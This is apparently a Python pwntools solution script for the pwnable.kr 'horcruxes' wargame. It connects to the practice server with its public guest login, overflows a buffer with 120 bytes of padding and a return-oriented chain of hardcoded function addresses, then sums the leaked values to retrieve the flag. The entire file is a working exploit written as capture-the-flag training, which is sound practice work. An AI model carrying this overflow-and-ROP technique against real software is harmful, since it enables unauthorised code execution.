from pwn import *

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

s = ssh(host='pwnable.kr', port=2222, user='horcruxes', password='guest')
#s.download_file('horcruxes')
#s.download_file('horcruxes.c')

#p = s.process("./horcruxes")
p = s.process(["nc", "0", "9032"])
#p = process("./horcruxes")

#gdb.attach(p, '''
#continue
#''')


func_a = p32(0x0809fe4b)
func_b = p32(0x0809fe6a)
func_c = p32(0x0809fe89)
func_d = p32(0x0809fea8)
func_e = p32(0x0809fec7)
func_f = p32(0x0809fee6)
func_g = p32(0x0809ff05)

#ropme_exp = p32(0x080a0009)
ropme_main = p32(0x0809fffc)

ropchain = func_a + func_b + func_c + func_d + func_e + func_f + func_g + ropme_main

padding = "A"*120

payload = padding + ropchain

p.recvuntil("Select Menu:")
p.sendline("-1")
p.recvuntil("How many EXP did you earned? : ")
p.sendline(payload)
data = p.recv()

sum = 0
for l in data.splitlines():
    if "Voldemort" in l or "Select" in l:
        continue
    exp = l.split("(")[1].split(" ")[1].split("+")[1].split(")")[0]
    sum += int(exp)
print sum

p.sendline("-1")
p.recvuntil("How many EXP did you earned? : ")
p.sendline(str(sum))
p.recvall()
p.interactive()
